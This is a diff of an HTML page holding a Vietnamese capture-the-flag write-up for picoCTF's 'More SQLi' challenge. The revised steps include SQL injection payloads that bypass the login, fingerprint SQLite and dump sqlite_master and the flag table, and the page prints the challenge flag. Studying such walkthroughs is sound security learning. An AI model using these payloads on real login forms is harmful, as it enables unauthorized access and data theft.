@@ -153,15 +153,19 @@
                     <p><a href="https://play.picoctf.org/practice/challenge/358?category=1&page=1&search=sql">Link challenge</a>    
                     <p>Ở challenge này chúng ta sẽ có 1 form login, và khi nhập <strong>username, password</strong> sẽ trả về chính username, password đó kèm theo 1 Query.</p>
                     <p><img src="../../img/more_sqli.png" alt="more_sqli.PNG" /></p> 
-                    <p>Ta có thể thấy có toán tử AND nên buộc cả 2 trường đúng thì mới login thành công, và mình đã test payload vào cả 2 trường <strong>username, password</strong></p>
-      
-                    <p class="box-note">' OR '1'='1--</p>
-                    <p><img src="../../img/more_sqli1.png" alt="more_sqli.PNG" /></p>     
-                    <p>Ở đây mình thấy 3 cột, và đề bài cũng đề cập SQLI nên mình test payload sau. </p>    
-                    <p class="box-note"> 1,2,3' UNION SELECT name,sql,null FROM sqlite_master--</p>
+                    <p>Nhìn vào query mình thử payload sau vào <strong>password</strong></p>    
+                    <p class="box-note">' OR 1=1;--</p>
+                    <p>Khi đó query sẽ trở thành như sau</p>
+                    <p class="box-note">SELECT id FROM users WHERE password = '' OR 1=1;-- AND username = 'admin'</p>
+                    <p><img src="../../img/more_sqli1.png" alt="more_sqli.PNG" /></p>    
+                    <p>Login thành công, giờ mình kiểm tra xem DB nào được sử dụng trong challenge này, vì challenge có 3 cột <strong>city, address, phone</strong> nên mình dùng <strong>UNION</strong> bằng payload sau</p>
+                    <p class="box-note">admin' UNION SELECT 1,sqlite_version(),3;--</p>
+                    <p><img src="../../img/more_sqli4.png" alt="more_sqli.PNG" /></p>    
+                    <p>Vậy là challenge này đang sử dụng <strong>SQLITE</strong> giờ mình tiến hành liệt kê các table bằng payload</p>    
+                    <p class="box-note"> admin' UNION SELECT name,sql,null FROM sqlite_master--</p>
                     <p><img src="../../img/more_sqli2.png" alt="more_sqli.PNG" /></p>     
                     <p>Mình đã tìm được bảng <strong>more_table</strong> có chứa column <strong>flag</strong></p>
-                    <p class="box-note"> admin' UNION SELECT flag,NULL,NULL from more_table--</p>   
+                    <p class="box-note"> admin' UNION SELECT flag,null,null FROM more_table--</p>   
                     <p><img src="../../img/more_sqli3.png" alt="more_sqli.png" /></p>
                     <p class="box-note">Flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}</p>
             </article>
